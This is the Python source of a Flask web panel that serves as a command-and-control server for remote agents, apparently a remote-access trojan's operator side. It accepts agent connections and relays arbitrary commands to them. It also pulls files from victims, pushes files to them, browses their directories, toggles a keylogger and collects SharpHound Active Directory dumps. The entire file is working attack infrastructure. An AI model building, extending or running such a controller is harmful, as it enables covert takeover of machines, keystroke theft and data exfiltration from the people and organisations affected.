from concurrent.futures import thread
from gzip import READ

from os import close
import os
import re
import socket 
import threading,time,flask
from flask import *
from pathlib import Path
import base64
import time,random,string 
import zipfile


ip_address = '0.0.0.0'
port_number = 1234

thread_index = 0
THREADS = []
CMD_INPUT = []
FILE_INPUT = []
CMD_OUTPUT = []
FILE_OUTPUT=[]
IPS = []
CWD=[]
BUFFER_SIZE = 4096*10
TO_DOWNLOAD=[]
CURRENT_WORKING_DIR = "D:\\python\\c2_yt"
GOT_OUTPUT = 0


for i in range(50):
    #THREADS.append('')
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    FILE_INPUT.append('')
    FILE_OUTPUT.append('')
    IPS.append('')
    CWD.append('.')
    TO_DOWNLOAD.append('')

app = Flask(__name__)

def close_connection(connection,thread_index):
    connection.close() 
    THREADS.remove(THREADS[thread_index])
    IPS[thread_index]=''
    CMD_INPUT[thread_index]=''
    CMD_OUTPUT[thread_index]=''

def handle_connection(connection,address,thread_index):
    global CMD_OUTPUT
    global CMD_INPUT
    global FILE_INPUT
    global FILE_OUTPUT
    global CWD
    global TO_DOWNLOAD
    
    while CMD_INPUT[thread_index]!='quit':
        #connection.settimeout(5)
        if CMD_INPUT[thread_index]=="powerup":
            time.sleep(5)
        msg = connection.recv(10240000).decode()
        #print("length of message is "+str(len(msg)))
        #while len(msg)==0 or msg!="Hello World":
            #msg = connection.recv(BUFFER_SIZE).decode()
        CMD_OUTPUT[thread_index] = msg
        while True:
            if CMD_INPUT[thread_index]!='' or FILE_INPUT[thread_index]!='' or TO_DOWNLOAD[thread_index]!='':

                if TO_DOWNLOAD[thread_index]!='':
                    # download-lengthoffiles
                    downloads = TO_DOWNLOAD[thread_index]
                    msg="download-"+str(len(downloads))+"-"+CWD[thread_index][0:-1]
                    #print(address)
                    connection.send(msg.encode())
                    #print("sent to client")
                    time.sleep(2)
                    for i in range(len(downloads)):
                        connection.send(downloads[i].encode())
                        filecontents = connection.recv(BUFFER_SIZE*1000)
                        f = open(downloads[i],'wb')
                        f.write(filecontents)
                        f.close()
                    msg = connection.recv(BUFFER_SIZE)
                    CMD_OUTPUT[thread_index]=msg
                    TO_DOWNLOAD[thread_index]=''



                elif FILE_INPUT[thread_index]!='':
                    # getdirectorycontents-directoryname
                    msg = "getdirectorycontents-"+FILE_INPUT[thread_index]
                    connection.send(msg.encode())
                    print(FILE_INPUT[thread_index])
                    msg = connection.recv(BUFFER_SIZE).decode()
                    GOT_OUTPUT=1
                    FILE_OUTPUT[thread_index] = msg
                    FILE_INPUT[thread_index]=''

                elif CMD_INPUT[thread_index].split(" ")[0]=='download':
                        #download filename
                        filename = CMD_INPUT[thread_index].split(" ")[1].split("\\")[-1]
                        print(filename)
                        cmd = CMD_INPUT[thread_index]
                        connection.send(cmd.encode())
                        connection.settimeout(7)
                        contents = connection.recv(BUFFER_SIZE*10000) 
                        connection.settimeout(None)
                        f = open(filename,'wb')
                        f.write(base64.b64decode(contents))
                        f.close()
                        #time.sleep(3)
                        CMD_OUTPUT[thread_index]='File Transferred successfully'
                        CMD_INPUT[thread_index]=''
                        #break
                    
                elif CMD_INPUT[thread_index].split(" ")[0]=='upload':
                        #upload filename dest 2048
                        cmd = CMD_INPUT[thread_index]
                        filename = CMD_INPUT[thread_index].split(" ")[1]
                        filesize = os.path.getsize('.\\output\\'+filename)
                        filesize += 1024
                        print(filesize)
                        CMD_INPUT[thread_index] += " "+str(filesize)
                        print(CMD_INPUT[thread_index])
                        connection.send(CMD_INPUT[thread_index].encode())
                        
                        destination = CMD_INPUT[thread_index].split(" ")[2]
                        #filesize = CMD_INPUT[thread_index].split(" ")[3]
                        
                        f = open('.\\output\\'+filename,'rb')
                        contents = f.read()
                        f.close()
                        connection.send(contents)
                        connection.settimeout(7)
                        msg = connection.recv(2048).decode()
                        connection.settimeout(None)
                        if msg =='got file':
                            CMD_OUTPUT[thread_index] = 'File Sent Successfully'
                            CMD_INPUT[thread_index]=''
                        else:
                            CMD_OUTPUT[thread_index]='Some Error Occurred'
                            CMD_INPUT[thread_index]='' 
                
                elif CMD_INPUT[thread_index]=="Get-SharpHoundZip":
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    #connection.settimeout(11)
                    contents = connection.recv(BUFFER_SIZE*5) 
                    print(len(contents))
                    #print(str(contents))
                    #connection.settimeout(None)
                    #print(len(contents))
                    filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    fd = open(".\\"+filename+".zip",'wb')
                    fd.write(contents)
                    fd.close()
                    #zf = zipfile.ZipFile(filename+".zip",'w')
                    #zf.wrirtestr(filename+".zip",contents)
                    #zf.close()
                    time.sleep(3)
                    contents2= connection.recv(BUFFER_SIZE)
                    #CMD_OUTPUT[thread_index]='File Transferred successfully'
                    CMD_INPUT[thread_index]=''


                elif CMD_INPUT[thread_index] == "keylog on":
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    CMD_INPUT[thread_index]=''
                
                elif CMD_INPUT[thread_index]=='keylog off':
                    cmd =CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    CMD_INPUT[thread_index]=''

                else:
                    msg = CMD_INPUT[thread_index]
                    connection.send(msg.encode())
                    if msg=='quit':
                        CMD_INPUT[thread_index]='quit'
                    else:
                        CMD_INPUT[thread_index]=''
                    #msg = connection.recv(BUFFER_SIZE).decode()
                    #CMD_OUTPUT[thread_index] = msg
                    break
            
            
    close_connection(connection,thread_index)


    
def server_socket():
    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.bind((ip_address,port_number))
    ss.listen(5)
    #def init_server():
    global THREADS
    global IPS
    while True:
        connection , address = ss.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_connection,args=(connection,address,len(THREADS)))
        THREADS.append(t)
        IPS[thread_index]=address
        t.start()


@app.before_first_request
def init_server():
    s1 = threading.Thread(target=server_socket)
    s1.start()

@app.route("/<agentname>/stuff")
def random(agentname):
    try:
        for i in THREADS:
                if agentname in i.name:
                    temp = THREADS.index(i)
        cmdoutput = CMD_OUTPUT[temp]
        return jsonify(result=cmdoutput)
    except:
        return render_template('index.html')


@app.route("/")
@app.route('/home')
def home():
    return render_template('index.html')


@app.route("/agents")
def agents():
    return render_template('agents.html',threads=THREADS,ips=IPS)


@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template("execute.html",name=agentname)


@app.route("/<agentname>/execute",methods=['GET','POST'])
def execute(agentname):
    if request.method=='GET':
        counter = 0
        cmd = request.args.get('d')
        # Get-SharpHoundZip
        #print(cmd)
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        prev = CMD_OUTPUT[req_index]
        #print("previous value->"+prev)
        CMD_INPUT[req_index]=cmd
        #time.sleep(2)
        if cmd=="Get-SharpHoundZip":
            CMD_OUTPUT[req_index]="Trying to initiate transfer... If you get incorrect or less data, run it again"
            #time.sleep(3)
            cmdoutput = CMD_OUTPUT[req_index]
            return render_template("execute.html",name=agentname,cmdoutput=cmdoutput)
        #time.sleep(5)
        if cmd=="powerup":
            time.sleep(20)
        while (prev==CMD_OUTPUT[req_index] and counter<10) or prev=="Hello World":
            time.sleep(0.5)
            counter+=1
        if counter>1:
            cmdoutput = CMD_OUTPUT[req_index]
            #counter = 0
        cmdoutput = CMD_OUTPUT[req_index]
        #print("Latest value->"+cmdoutput)
        return render_template("execute.html",name=agentname,cmdoutput=cmdoutput)
    if request.method=='POST':
        cmd = request.form['command']
        counter = 0
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        prev = CMD_OUTPUT[req_index]
        CMD_INPUT[req_index]=cmd
        if CMD_INPUT[req_index].split(" ")[0] in ["download","upload"]:
            time.sleep(6)
        time.sleep(1)
        cmdoutput = CMD_OUTPUT[req_index]
        while (prev==CMD_OUTPUT[req_index] and counter<10) or prev=="Hello World":
            time.sleep(0.5)
            counter+=1
        if counter>0:
            cmdoutput = CMD_OUTPUT[req_index]
            counter=0
        return ('',204)
        #return Response(status=200)
        #return render_template('execute.html',cmdoutput=cmdoutput,name=agentname,ips=IPS)


#@app.route("/<agentname")



@app.route("/temp",methods=['GET','POST'])
def temp():
    l =[['D',"test"],['F', 'LICENSE.txt'], ['F', 'NEWS.txt'], ['F', 'python.exe'], ['F', 'python3.dll'], ['F', 'python39.dll'], ['F', 'pythonw.exe'], ['F', 'vcruntime140.dll'], ['F', 'vcruntime140_1.dll']]
    if request.method=="POST":
        print(request.form.getlist("checkbox2"))
    return render_template("checkbox.html",cwd=os.getcwd(),data=l)


@app.route("/temp/<dirname>",methods=["GET","POST"])
def tempup(dirname):
    #print(CURRENT_WORKING_DIR)
    directory_name = request.args.get('data')
    if (request.args.get('data')=="D:" or request.args.get('data')=="D:\\") and dirname=="up":
        CURRENT_WORKING_DIR = "D:\\"
        files = os.listdir(CURRENT_WORKING_DIR)
        #print(files)
        l=[]
        for i in range(len(files)):
            if os.path.isdir(CURRENT_WORKING_DIR+"\\"+files[i]):
                l.append(["D",files[i]])
            else:
                l.append(["F",files[i]])
        print(l)
        return render_template("checkbox.html",cwd=CURRENT_WORKING_DIR,data=l)
    
    if dirname=="up":
        CURRENT_WORKING_DIR = directory_name
        CURRENT_WORKING_DIR = "\\".join(CURRENT_WORKING_DIR.split("\\")[0:-1])
        files = os.listdir(CURRENT_WORKING_DIR)
        #print(files)
        l=[]
        for i in range(len(files)):
            if os.path.isdir(CURRENT_WORKING_DIR+"\\"+files[i]):
                l.append(["D",files[i]])
            else:
                l.append(["F",files[i]])
        print(l)
        return render_template("checkbox.html",cwd=CURRENT_WORKING_DIR,data=l)    
    l = []
    CURRENT_WORKING_DIR = request.args.get('data') + "\\"+dirname
    files = os.listdir(CURRENT_WORKING_DIR)
    print(files)
    l=[]
    for i in range(len(files)):
        if os.path.isdir(CURRENT_WORKING_DIR+"\\"+files[i]):
            l.append(["D",files[i]])
        else:
            l.append(["F",files[i]])
    print(l)
    return render_template("checkbox.html",cwd=CURRENT_WORKING_DIR,data=l)


@app.route("/<agentname>/file-manager",methods=["GET","POST"])
def filemanager(agentname): 
    for i in THREADS:
        if agentname in i.name:
            req_index = THREADS.index(i)
    if request.args.get('data'):
        print("previous dir"+CWD[req_index])
        print(str(request.args.get('data')))
        
        FILE_INPUT[req_index] = CWD[req_index][0:-1 ]  +"\\"+ str(request.args.get('data'))
        print("latest input "+FILE_INPUT[req_index])
    else:
        FILE_INPUT[req_index]="."
    #cwd = FILE_INPUT[req_index] = "."
    time.sleep(1)
    print(FILE_OUTPUT[req_index])
    fileoutput = FILE_OUTPUT[req_index].split('\n')
    print(fileoutput[0])
    CWD[req_index] = fileoutput[0]
    fileoutput = fileoutput[1:]
    for i in range(len(fileoutput)):
        fileoutput[i]=list(fileoutput[i].split("->"))
    return render_template("filemanager.html",cwd=CWD[req_index],fileoutput=fileoutput,agentname=agentname)
    #pass 
 


@app.route("/<agentname>/downloadfiles",methods=["GET","POST"])
def downloadfiles(agentname):
    for i in THREADS:
        if agentname in i.name:
            req_index = THREADS.index(i)
    #print(req_index)
    filenames = request.args.getlist("checkbox2")
    cwd = request.args.get('cwd')
    
    for i in range(len(filenames)):
        filenames[i] = filenames[i].replace("\r\n","")
    print(filenames)
    TO_DOWNLOAD[req_index] = filenames
    fileoutput = FILE_OUTPUT[req_index].split('\n')
    print(fileoutput[0])
    CWD[req_index] = fileoutput[0]
    fileoutput = fileoutput[1:]
    for i in range(len(fileoutput)):
        fileoutput[i]=list(fileoutput[i].split("->"))
    return render_template("filemanager.html",cwd=cwd,agentname=agentname,fileoutput=fileoutput)


if __name__=='__main__':
    app.run(debug=True)

